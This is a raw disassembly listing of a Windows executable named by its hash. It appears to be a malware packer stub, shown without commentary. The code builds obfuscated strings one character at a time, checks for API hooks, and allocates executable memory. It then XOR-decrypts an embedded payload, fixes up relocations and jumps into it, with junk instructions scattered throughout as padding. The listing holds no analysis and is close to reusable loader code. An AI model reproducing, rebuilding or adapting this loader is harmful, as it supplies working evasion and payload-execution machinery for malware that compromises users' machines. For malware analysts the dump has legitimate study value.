
a62fdf368f81f89ed5cfea73e758cfb538ed6c8e78c3271352b0580d306c9b29.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	call   0x401020
  401008:	pop    ebp
  401009:	ret    
  40100a:	int3   
  40100b:	int3   
  40100c:	int3   
  40100d:	int3   
  40100e:	int3   
  40100f:	int3   
  401010:	push   ebp
  401011:	mov    ebp,esp
  401013:	mov    eax,DWORD PTR [ebp+0x8]
  401016:	mov    eax,DWORD PTR [eax-0x4]
  401019:	pop    ebp
  40101a:	ret    
  40101b:	int3   
  40101c:	int3   
  40101d:	int3   
  40101e:	int3   
  40101f:	int3   
  401020:	push   ebp
  401021:	mov    ebp,esp
  401023:	call   0x401580
  401028:	mov    eax,ds:0x427974
  40102d:	push   eax
  40102e:	call   0x401010
  401033:	add    esp,0x4
  401036:	mov    ds:0x427978,eax
  40103b:	mov    ecx,DWORD PTR ds:0x427978
  401041:	push   ecx
  401042:	call   0x401a00
  401047:	add    esp,0x4
  40104a:	mov    ds:0x42797c,eax
  40104f:	pop    ebp
  401050:	ret    
  401051:	int3   
  401052:	int3   
  401053:	int3   
  401054:	int3   
  401055:	int3   
  401056:	int3   
  401057:	int3   
  401058:	int3   
  401059:	int3   
  40105a:	int3   
  40105b:	int3   
  40105c:	int3   
  40105d:	int3   
  40105e:	int3   
  40105f:	int3   
  401060:	push   ebp
  401061:	mov    ebp,esp
  401063:	sub    esp,0x14
  401066:	mov    eax,ds:0x427898
  40106b:	mov    DWORD PTR [ebp-0x10],eax
  40106e:	mov    DWORD PTR [ebp-0xc],0x425000
  401075:	mov    DWORD PTR [ebp-0x4],0x425070
  40107c:	mov    ecx,DWORD PTR [ebp-0x10]
  40107f:	movzx  edx,BYTE PTR [ecx]
  401082:	cmp    edx,0x55
  401085:	je     0x4010a4
  401087:	mov    eax,DWORD PTR [ebp-0x10]
  40108a:	movzx  ecx,BYTE PTR [eax]
  40108d:	cmp    ecx,0x8b
  401093:	je     0x4010a4
  401095:	mov    edx,DWORD PTR [ebp-0x10]
  401098:	movzx  eax,BYTE PTR [edx]
  40109b:	cmp    eax,0x6a
  40109e:	je     0x4010a4
  4010a0:	xor    eax,eax
  4010a2:	jmp    0x401115
  4010a4:	mov    ecx,0x52
  4010a9:	mov    edx,DWORD PTR [ebp-0x4]
  4010ac:	mov    WORD PTR [edx],cx
  4010af:	mov    eax,0x65
  4010b4:	mov    ecx,DWORD PTR [ebp-0x4]
  4010b7:	mov    WORD PTR [ecx+0x2],ax
  4010bb:	mov    edx,0x65
  4010c0:	mov    eax,DWORD PTR [ebp-0x4]
  4010c3:	mov    WORD PTR [eax+0xa],dx
  4010c7:	mov    ecx,0x6e
  4010cc:	mov    edx,DWORD PTR [ebp-0x4]
  4010cf:	mov    WORD PTR [edx+0xc],cx
  4010d3:	mov    eax,0x4b
  4010d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4010db:	mov    WORD PTR [ecx+0xe],ax
  4010df:	mov    edx,DWORD PTR ds:0x4278a0
  4010e5:	mov    DWORD PTR [ebp-0x8],edx
  4010e8:	lea    eax,[ebp-0x14]
  4010eb:	push   eax
  4010ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4010ef:	push   ecx
  4010f0:	push   0x80000002
  4010f5:	call   DWORD PTR [ebp-0x8]
  4010f8:	test   eax,eax
  4010fa:	jne    0x401105
  4010fc:	mov    eax,0x1
  401101:	jmp    0x401115
  401103:	jmp    0x401115
  401105:	push   0x1
  401107:	push   0x1
  401109:	push   0x1
  40110b:	call   0x401b70
  401110:	add    esp,0xc
  401113:	xor    eax,eax
  401115:	mov    esp,ebp
  401117:	pop    ebp
  401118:	ret    
  401119:	int3   
  40111a:	int3   
  40111b:	int3   
  40111c:	int3   
  40111d:	int3   
  40111e:	int3   
  40111f:	int3   
  401120:	push   ebp
  401121:	mov    ebp,esp
  401123:	cmp    DWORD PTR [ebp+0x8],0x1
  401127:	jne    0x401131
  401129:	mov    eax,ds:0x427980
  40112e:	mov    DWORD PTR [ebp+0x8],eax
  401131:	mov    ecx,DWORD PTR [ebp+0x10]
  401134:	push   ecx
  401135:	mov    edx,DWORD PTR [ebp+0xc]
  401138:	push   edx
  401139:	mov    eax,DWORD PTR [ebp+0x8]
  40113c:	push   eax
  40113d:	call   0x4015b0
  401142:	add    esp,0xc
  401145:	mov    ecx,DWORD PTR [ebp+0x8]
  401148:	push   ecx
  401149:	call   0x4019f0
  40114e:	add    esp,0x4
  401151:	mov    DWORD PTR [ebp+0x8],eax
  401154:	mov    eax,DWORD PTR [ebp+0x8]
  401157:	pop    ebp
  401158:	ret    
  401159:	int3   
  40115a:	int3   
  40115b:	int3   
  40115c:	int3   
  40115d:	int3   
  40115e:	int3   
  40115f:	int3   
  401160:	push   ebp
  401161:	mov    ebp,esp
  401163:	sub    esp,0x220
  401169:	mov    DWORD PTR [ebp-0x210],0x0
  401173:	mov    DWORD PTR [ebp-0x20c],0x42507c
  40117d:	mov    eax,ds:0x427878
  401182:	mov    ds:0x427984,eax
  401187:	push   0x425080
  40118c:	push   0x42508c
  401191:	call   DWORD PTR ds:0x42787c
  401197:	push   eax
  401198:	call   DWORD PTR ds:0x427880
  40119e:	mov    ds:0x427988,eax
  4011a3:	mov    DWORD PTR [ebp-0x218],0x0
  4011ad:	jmp    0x4011be
  4011af:	mov    ecx,DWORD PTR [ebp-0x218]
  4011b5:	add    ecx,0x4
  4011b8:	mov    DWORD PTR [ebp-0x218],ecx
  4011be:	mov    edx,DWORD PTR [ebp-0x218]
  4011c4:	cmp    edx,DWORD PTR [ebp+0xc]
  4011c7:	jae    0x401222
  4011c9:	mov    eax,DWORD PTR [ebp-0x218]
  4011cf:	add    eax,0x5b3e
  4011d4:	mov    ds:0x42798c,eax
  4011d9:	mov    ecx,DWORD PTR [ebp+0x8]
  4011dc:	add    ecx,DWORD PTR [ebp-0x218]
  4011e2:	mov    DWORD PTR [ebp-0x220],ecx
  4011e8:	mov    edx,DWORD PTR [ebp-0x220]
  4011ee:	mov    eax,DWORD PTR [edx]
  4011f0:	add    eax,DWORD PTR [ebp-0x218]
  4011f6:	mov    ecx,DWORD PTR [ebp-0x220]
  4011fc:	mov    DWORD PTR [ecx],eax
  4011fe:	mov    edx,DWORD PTR [ebp-0x220]
  401204:	mov    DWORD PTR [ebp-0x21c],edx
  40120a:	mov    eax,DWORD PTR [ebp-0x21c]
  401210:	mov    ecx,DWORD PTR [eax]
  401212:	xor    ecx,DWORD PTR ds:0x42798c
  401218:	mov    edx,DWORD PTR [ebp-0x21c]
  40121e:	mov    DWORD PTR [edx],ecx
  401220:	jmp    0x4011af
  401222:	mov    esp,ebp
  401224:	pop    ebp
  401225:	ret    
  401226:	int3   
  401227:	int3   
  401228:	int3   
  401229:	int3   
  40122a:	int3   
  40122b:	int3   
  40122c:	int3   
  40122d:	int3   
  40122e:	int3   
  40122f:	int3   
  401230:	push   ebp
  401231:	mov    ebp,esp
  401233:	sub    esp,0x2cc
  401239:	push   ebx
  40123a:	push   esi
  40123b:	push   edi
  40123c:	mov    DWORD PTR [ebp-0x290],0x401a90
  401246:	mov    DWORD PTR ds:0x427990,ebp
  40124c:	pusha  
  40124d:	mov    DWORD PTR [ebp-0x294],0x0
  401257:	mov    DWORD PTR [ebp-0x2a4],0x80000002
  401261:	call   0x401060
  401266:	test   eax,eax
  401268:	je     0x4012a2
  40126a:	call   0x401550
  40126f:	mov    eax,ds:0x427974
  401274:	push   eax
  401275:	call   0x401010
  40127a:	add    esp,0x4
  40127d:	mov    ds:0x427978,eax
  401282:	mov    ecx,DWORD PTR ds:0x427978
  401288:	push   ecx
  401289:	call   0x401a00
  40128e:	add    esp,0x4
  401291:	mov    ds:0x427994,eax
  401296:	mov    edx,DWORD PTR ds:0x427978
  40129c:	mov    DWORD PTR [ebp-0x29c],edx
  4012a2:	mov    DWORD PTR [ebp-0x288],0x64
  4012ac:	mov    DWORD PTR [ebp-0x224],0x2a
  4012b6:	mov    DWORD PTR [ebp-0x294],0x0
  4012c0:	mov    DWORD PTR [ebp-0x258],0x0
  4012ca:	mov    DWORD PTR [ebp-0x284],0x1
  4012d4:	mov    DWORD PTR [ebp-0x21c],0x0
  4012de:	mov    eax,DWORD PTR [ebp-0x294]
  4012e4:	cmp    eax,DWORD PTR ds:0x427978
  4012ea:	jae    0x401376
  4012f0:	mov    ecx,DWORD PTR [ebp-0x29c]
  4012f6:	push   ecx
  4012f7:	mov    edx,DWORD PTR [ebp-0x288]
  4012fd:	push   edx
  4012fe:	call   0x401b30
  401303:	add    esp,0x8
  401306:	mov    DWORD PTR [ebp-0x2a0],eax
  40130c:	mov    eax,DWORD PTR [ebp-0x2a0]
  401312:	push   eax
  401313:	mov    ecx,DWORD PTR ds:0x427974
  401319:	add    ecx,DWORD PTR [ebp-0x258]
  40131f:	push   ecx
  401320:	mov    edx,DWORD PTR ds:0x427994
  401326:	add    edx,DWORD PTR [ebp-0x294]
  40132c:	push   edx
  40132d:	call   0x401870
  401332:	add    esp,0xc
  401335:	mov    eax,DWORD PTR [ebp-0x224]
  40133b:	add    eax,DWORD PTR [ebp-0x288]
  401341:	add    eax,DWORD PTR [ebp-0x258]
  401347:	mov    DWORD PTR [ebp-0x258],eax
  40134d:	mov    ecx,DWORD PTR [ebp-0x294]
  401353:	add    ecx,DWORD PTR [ebp-0x288]
  401359:	mov    DWORD PTR [ebp-0x294],ecx
  40135f:	mov    edx,DWORD PTR [ebp-0x29c]
  401365:	sub    edx,DWORD PTR [ebp-0x2a0]
  40136b:	mov    DWORD PTR [ebp-0x29c],edx
  401371:	jmp    0x4012de
  401376:	mov    eax,ds:0x427978
  40137b:	push   eax
  40137c:	mov    ecx,DWORD PTR ds:0x427994
  401382:	push   ecx
  401383:	call   0x401160
  401388:	add    esp,0x8
  40138b:	mov    DWORD PTR [ebp-0x258],0x0
  401395:	mov    DWORD PTR [ebp-0x2c0],0x0
  40139f:	mov    edx,DWORD PTR ds:0x427978
  4013a5:	push   edx
  4013a6:	push   0x0
  4013a8:	mov    eax,ds:0x42797c
  4013ad:	push   eax
  4013ae:	call   0x401000
  4013b3:	add    esp,0xc
  4013b6:	mov    ecx,DWORD PTR ds:0x427978
  4013bc:	mov    DWORD PTR [ebp-0x2c8],ecx
  4013c2:	mov    edx,DWORD PTR [ebp-0x2c0]
  4013c8:	cmp    edx,DWORD PTR ds:0x427978
  4013ce:	jae    0x401459
  4013d4:	mov    eax,DWORD PTR [ebp-0x2c8]
  4013da:	push   eax
  4013db:	mov    ecx,DWORD PTR [ebp-0x288]
  4013e1:	push   ecx
  4013e2:	call   0x401b30
  4013e7:	add    esp,0x8
  4013ea:	mov    DWORD PTR [ebp-0x2cc],eax
  4013f0:	mov    edx,DWORD PTR [ebp-0x2cc]
  4013f6:	push   edx
  4013f7:	mov    eax,ds:0x427974
  4013fc:	add    eax,DWORD PTR [ebp-0x258]
  401402:	push   eax
  401403:	mov    ecx,DWORD PTR ds:0x42797c
  401409:	add    ecx,DWORD PTR [ebp-0x2c0]
  40140f:	push   ecx
  401410:	call   0x401870
  401415:	add    esp,0xc
  401418:	mov    edx,DWORD PTR [ebp-0x224]
  40141e:	add    edx,DWORD PTR [ebp-0x288]
  401424:	add    edx,DWORD PTR [ebp-0x258]
  40142a:	mov    DWORD PTR [ebp-0x258],edx
  401430:	mov    eax,DWORD PTR [ebp-0x2c0]
  401436:	add    eax,DWORD PTR [ebp-0x288]
  40143c:	mov    DWORD PTR [ebp-0x2c0],eax
  401442:	mov    ecx,DWORD PTR [ebp-0x2c8]
  401448:	sub    ecx,DWORD PTR [ebp-0x2cc]
  40144e:	mov    DWORD PTR [ebp-0x2c8],ecx
  401454:	jmp    0x4013c2
  401459:	mov    edx,DWORD PTR ds:0x427978
  40145f:	push   edx
  401460:	mov    eax,ds:0x42797c
  401465:	push   eax
  401466:	call   0x401160
  40146b:	add    esp,0x8
  40146e:	mov    DWORD PTR [ebp-0x290],0x401a90
  401478:	mov    ecx,DWORD PTR ds:0x427994
  40147e:	mov    edx,DWORD PTR ds:0x42797c
  401484:	mov    DWORD PTR [ecx],edx
  401486:	push   0x19000
  40148b:	call   0x401a00
  401490:	add    esp,0x4
  401493:	mov    ds:0x427998,eax
  401498:	mov    eax,ds:0x427998
  40149d:	add    eax,0x200
  4014a2:	mov    ds:0x42799c,eax
  4014a7:	push   0x17700
  4014ac:	mov    ecx,DWORD PTR ds:0x427994
  4014b2:	push   ecx
  4014b3:	mov    edx,DWORD PTR ds:0x42799c
  4014b9:	push   edx
  4014ba:	call   0x401870
  4014bf:	add    esp,0xc
  4014c2:	mov    eax,ds:0x427998
  4014c7:	add    eax,0x17590
  4014cc:	mov    ds:0x4279a0,eax
  4014d1:	popa   
  4014d2:	push   0x37
  4014d4:	mov    eax,DWORD PTR [ebp-0x290]
  4014da:	mov    ecx,esp
  4014dc:	sub    ecx,0x22
  4014df:	mov    edx,0x1e
  4014e4:	mov    DWORD PTR [ecx+edx*1+0x4],eax
  4014e8:	ret    
  4014e9:	xor    eax,eax
  4014eb:	pop    edi
  4014ec:	pop    esi
  4014ed:	pop    ebx
  4014ee:	mov    esp,ebp
  4014f0:	pop    ebp
  4014f1:	ret    
  4014f2:	int3   
  4014f3:	int3   
  4014f4:	int3   
  4014f5:	int3   
  4014f6:	int3   
  4014f7:	int3   
  4014f8:	int3   
  4014f9:	int3   
  4014fa:	int3   
  4014fb:	int3   
  4014fc:	int3   
  4014fd:	int3   
  4014fe:	int3   
  4014ff:	int3   
  401500:	push   ebp
  401501:	mov    ebp,esp
  401503:	call   0x401230
  401508:	pop    ebp
  401509:	ret    
  40150a:	int3   
  40150b:	int3   
  40150c:	int3   
  40150d:	int3   
  40150e:	int3   
  40150f:	int3   
  401510:	push   ebp
  401511:	mov    ebp,esp
  401513:	mov    eax,ds:0x4279a4
  401518:	sub    eax,0x8
  40151b:	shr    eax,1
  40151d:	mov    ds:0x4279a4,eax
  401522:	pop    ebp
  401523:	ret    
  401524:	int3   
  401525:	int3   
  401526:	int3   
  401527:	int3   
  401528:	int3   
  401529:	int3   
  40152a:	int3   
  40152b:	int3   
  40152c:	int3   
  40152d:	int3   
  40152e:	int3   
  40152f:	int3   
  401530:	push   ebp
  401531:	mov    ebp,esp
  401533:	pop    ebp
  401534:	ret    0x10
  401537:	int3   
  401538:	int3   
  401539:	int3   
  40153a:	int3   
  40153b:	int3   
  40153c:	int3   
  40153d:	int3   
  40153e:	int3   
  40153f:	int3   
  401540:	push   ebp
  401541:	mov    ebp,esp
  401543:	pop    ebp
  401544:	ret    0x10
  401547:	int3   
  401548:	int3   
  401549:	int3   
  40154a:	int3   
  40154b:	int3   
  40154c:	int3   
  40154d:	int3   
  40154e:	int3   
  40154f:	int3   
  401550:	push   ebp
  401551:	mov    ebp,esp
  401553:	sub    esp,0x10
  401556:	mov    DWORD PTR [ebp-0x10],0x40321e
  40155d:	mov    DWORD PTR [ebp-0x4],0x4
  401564:	mov    eax,DWORD PTR [ebp-0x10]
  401567:	add    eax,DWORD PTR [ebp-0x4]
  40156a:	mov    DWORD PTR [ebp-0xc],eax
  40156d:	mov    ecx,DWORD PTR [ebp-0xc]
  401570:	mov    DWORD PTR [ebp-0x8],ecx
  401573:	mov    edx,DWORD PTR [ebp-0x8]
  401576:	mov    DWORD PTR ds:0x427974,edx
  40157c:	mov    esp,ebp
  40157e:	pop    ebp
  40157f:	ret    
  401580:	push   ebp
  401581:	mov    ebp,esp
  401583:	sub    esp,0x8
  401586:	mov    DWORD PTR [ebp-0x4],0x4
  40158d:	mov    eax,DWORD PTR [ebp-0x4]
  401590:	add    eax,0x402f48
  401595:	mov    ds:0x427974,eax
  40159a:	mov    ecx,DWORD PTR ds:0x4278a4
  4015a0:	mov    DWORD PTR [ebp-0x8],ecx
  4015a3:	mov    esp,ebp
  4015a5:	pop    ebp
  4015a6:	ret    
  4015a7:	int3   
  4015a8:	int3   
  4015a9:	int3   
  4015aa:	int3   
  4015ab:	int3   
  4015ac:	int3   
  4015ad:	int3   
  4015ae:	int3   
  4015af:	int3   
  4015b0:	push   ebp
  4015b1:	mov    ebp,esp
  4015b3:	sub    esp,0x8
  4015b6:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015bd:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015c4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015cb:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015d2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015d9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015e0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015e7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015ee:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015f5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015fc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401603:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40160a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401611:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401618:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40161f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401626:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40162d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401634:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40163b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401642:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401649:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401650:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401657:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40165e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401665:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40166c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401673:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40167a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401681:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401688:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40168f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401696:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40169d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016a4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ab:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016b2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016b9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016c0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016c7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ce:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016d5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016dc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016e3:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ea:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016f1:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016f8:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ff:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401706:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40170d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401714:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40171b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401722:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401729:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401730:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401737:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40173e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401745:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40174c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401753:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40175a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401761:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401768:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40176f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401776:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40177d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401784:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40178b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401792:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401799:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017a0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017a7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017ae:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017b5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017bc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017c3:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017ca:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017d1:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017d8:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017df:	mov    DWORD PTR [ebp-0x4],0x0
  4017e6:	jmp    0x4017f1
  4017e8:	mov    eax,DWORD PTR [ebp-0x4]
  4017eb:	add    eax,0x1
  4017ee:	mov    DWORD PTR [ebp-0x4],eax
  4017f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4017f4:	cmp    ecx,DWORD PTR ds:0x4279a4
  4017fa:	jae    0x40185f
  4017fc:	mov    edx,DWORD PTR [ebp-0x4]
  4017ff:	push   edx
  401800:	mov    eax,ds:0x4279a8
  401805:	push   eax
  401806:	call   0x401ad0
  40180b:	add    esp,0x8
  40180e:	sar    eax,0xc
  401811:	cmp    eax,0x3
  401814:	jne    0x40185d
  401816:	mov    ecx,DWORD PTR [ebp-0x4]
  401819:	push   ecx
  40181a:	mov    edx,DWORD PTR ds:0x4279a8
  401820:	push   edx
  401821:	call   0x401ad0
  401826:	add    esp,0x8
  401829:	and    eax,0xfff
  40182e:	add    eax,0x5d6fc8
  401833:	mov    DWORD PTR [ebp-0x8],eax
  401836:	mov    eax,DWORD PTR [ebp+0x8]
  401839:	mov    ecx,DWORD PTR [ebp+0xc]
  40183c:	add    ecx,DWORD PTR [eax]
  40183e:	mov    edx,DWORD PTR [ebp-0x8]
  401841:	mov    eax,DWORD PTR [ecx+edx*1-0x5d6fc8]
  401848:	add    eax,DWORD PTR [ebp+0x10]
  40184b:	mov    ecx,DWORD PTR [ebp+0x8]
  40184e:	mov    edx,DWORD PTR [ebp+0xc]
  401851:	add    edx,DWORD PTR [ecx]
  401853:	mov    ecx,DWORD PTR [ebp-0x8]
  401856:	mov    DWORD PTR [edx+ecx*1-0x5d6fc8],eax
  40185d:	jmp    0x4017e8
  40185f:	mov    esp,ebp
  401861:	pop    ebp
  401862:	ret    
  401863:	int3   
  401864:	int3   
  401865:	int3   
  401866:	int3   
  401867:	int3   
  401868:	int3   
  401869:	int3   
  40186a:	int3   
  40186b:	int3   
  40186c:	int3   
  40186d:	int3   
  40186e:	int3   
  40186f:	int3   
  401870:	push   ebp
  401871:	mov    ebp,esp
  401873:	sub    esp,0x214
  401879:	push   0x104
  40187e:	lea    eax,[ebp-0x208]
  401884:	push   eax
  401885:	call   DWORD PTR ds:0x4279ac
  40188b:	mov    DWORD PTR [ebp-0x210],0x0
  401895:	jmp    0x4018a6
  401897:	mov    ecx,DWORD PTR [ebp-0x210]
  40189d:	add    ecx,0x1
  4018a0:	mov    DWORD PTR [ebp-0x210],ecx
  4018a6:	mov    edx,DWORD PTR [ebp-0x210]
  4018ac:	cmp    edx,DWORD PTR [ebp+0x10]
  4018af:	jge    0x4019a8
  4018b5:	cmp    DWORD PTR [ebp-0x210],0x0
  4018bc:	jne    0x40198d
  4018c2:	mov    DWORD PTR [ebp-0x214],0x4250b8
  4018cc:	mov    eax,0x5c
  4018d1:	mov    ecx,DWORD PTR [ebp-0x214]
  4018d7:	mov    WORD PTR [ecx],ax
  4018da:	mov    edx,0x65
  4018df:	mov    eax,DWORD PTR [ebp-0x214]
  4018e5:	mov    WORD PTR [eax+0xa],dx
  4018e9:	mov    ecx,0x6d
  4018ee:	mov    edx,DWORD PTR [ebp-0x214]
  4018f4:	mov    WORD PTR [edx+0xc],cx
  4018f8:	mov    eax,0x33
  4018fd:	mov    ecx,DWORD PTR [ebp-0x214]
  401903:	mov    WORD PTR [ecx+0xe],ax
  401907:	mov    edx,0x32
  40190c:	mov    eax,DWORD PTR [ebp-0x214]
  401912:	mov    WORD PTR [eax+0x10],dx
  401916:	mov    ecx,0x5c
  40191b:	mov    edx,DWORD PTR [ebp-0x214]
  401921:	mov    WORD PTR [edx+0x12],cx
  401925:	mov    eax,0x73
  40192a:	mov    ecx,DWORD PTR [ebp-0x214]
  401930:	mov    WORD PTR [ecx+0x16],ax
  401934:	mov    edx,0x65
  401939:	mov    eax,DWORD PTR [ebp-0x214]
  40193f:	mov    WORD PTR [eax+0x24],dx
  401943:	mov    ecx,DWORD PTR [ebp-0x214]
  401949:	push   ecx
  40194a:	lea    edx,[ebp-0x208]
  401950:	push   edx
  401951:	call   DWORD PTR ds:0x427984
  401957:	push   0x0
  401959:	push   0x80
  40195e:	push   0x3
  401960:	push   0x0
  401962:	push   0x3
  401964:	push   0x1
  401966:	lea    eax,[ebp-0x208]
  40196c:	push   eax
  40196d:	call   DWORD PTR ds:0x427988
  401973:	mov    DWORD PTR [ebp-0x20c],eax
  401979:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  401980:	je     0x40198b
  401982:	cmp    DWORD PTR [ebp-0x20c],0x0
  401989:	jne    0x40198d
  40198b:	jmp    0x4019e2
  40198d:	mov    ecx,DWORD PTR [ebp+0x8]
  401990:	add    ecx,DWORD PTR [ebp-0x210]
  401996:	mov    edx,DWORD PTR [ebp+0xc]
  401999:	add    edx,DWORD PTR [ebp-0x210]
  40199f:	mov    al,BYTE PTR [edx]
  4019a1:	mov    BYTE PTR [ecx],al
  4019a3:	jmp    0x401897
  4019a8:	mov    ecx,DWORD PTR [ebp+0x8]
  4019ab:	cmp    ecx,DWORD PTR ds:0x42799c
  4019b1:	jne    0x4019d5
  4019b3:	mov    edx,DWORD PTR ds:0x427998
  4019b9:	sub    edx,0x400000
  4019bf:	push   edx
  4019c0:	mov    eax,ds:0x427998
  4019c5:	push   eax
  4019c6:	mov    ecx,DWORD PTR ds:0x42797c
  4019cc:	push   ecx
  4019cd:	call   0x401b70
  4019d2:	add    esp,0xc
  4019d5:	mov    edx,DWORD PTR [ebp-0x20c]
  4019db:	push   edx
  4019dc:	call   DWORD PTR ds:0x427884
  4019e2:	mov    esp,ebp
  4019e4:	pop    ebp
  4019e5:	ret    
  4019e6:	int3   
  4019e7:	int3   
  4019e8:	int3   
  4019e9:	int3   
  4019ea:	int3   
  4019eb:	int3   
  4019ec:	int3   
  4019ed:	int3   
  4019ee:	int3   
  4019ef:	int3   
  4019f0:	push   ebp
  4019f1:	mov    ebp,esp
  4019f3:	mov    eax,DWORD PTR [ebp+0x8]
  4019f6:	mov    ecx,DWORD PTR [ebp+0x8]
  4019f9:	add    ecx,DWORD PTR [eax+0x4]
  4019fc:	mov    eax,ecx
  4019fe:	pop    ebp
  4019ff:	ret    
  401a00:	push   ebp
  401a01:	mov    ebp,esp
  401a03:	sub    esp,0x220
  401a09:	mov    DWORD PTR [ebp-0x8],0x215
  401a10:	mov    DWORD PTR [ebp-0x220],0x3000
  401a1a:	mov    DWORD PTR [ebp-0x4],0x40
  401a21:	mov    DWORD PTR [ebp-0x214],0x0
  401a2b:	mov    DWORD PTR [ebp-0x218],0x0
  401a35:	mov    eax,ds:0x427888
  401a3a:	mov    ds:0x4279ac,eax
  401a3f:	push   0x104
  401a44:	lea    ecx,[ebp-0x210]
  401a4a:	push   ecx
  401a4b:	call   DWORD PTR ds:0x4279ac
  401a51:	mov    edx,DWORD PTR ds:0x427878
  401a57:	mov    DWORD PTR ds:0x427984,edx
  401a5d:	mov    eax,ds:0x42788c
  401a62:	mov    ds:0x427988,eax
  401a67:	mov    ecx,DWORD PTR [ebp-0x4]
  401a6a:	push   ecx
  401a6b:	mov    edx,DWORD PTR [ebp-0x220]
  401a71:	push   edx
  401a72:	mov    eax,DWORD PTR [ebp+0x8]
  401a75:	push   eax
  401a76:	mov    ecx,DWORD PTR [ebp-0x214]
  401a7c:	push   ecx
  401a7d:	push   0xffffffff
  401a7f:	call   DWORD PTR ds:0x427890
  401a85:	mov    esp,ebp
  401a87:	pop    ebp
  401a88:	ret    
  401a89:	int3   
  401a8a:	int3   
  401a8b:	int3   
  401a8c:	int3   
  401a8d:	int3   
  401a8e:	int3   
  401a8f:	int3   
  401a90:	push   ebp
  401a91:	mov    ebp,esp
  401a93:	push   ecx
  401a94:	mov    DWORD PTR [ebp-0x4],0x5e3d
  401a9b:	mov    ecx,ecx
  401a9d:	mov    ecx,ecx
  401a9f:	mov    ecx,ecx
  401aa1:	mov    ecx,ecx
  401aa3:	mov    edx,edx
  401aa5:	mov    edx,edx
  401aa7:	mov    edx,edx
  401aa9:	mov    ecx,ecx
  401aab:	mov    esp,DWORD PTR ds:0x427990
  401ab1:	mov    ecx,ecx
  401ab3:	mov    edx,edx
  401ab5:	mov    ecx,ecx
  401ab7:	mov    edx,edx
  401ab9:	add    esp,0x4
  401abc:	mov    edx,edx
  401abe:	mov    ecx,ecx
  401ac0:	mov    edx,edx
  401ac2:	mov    edx,edx
  401ac4:	jmp    DWORD PTR ds:0x4279a0
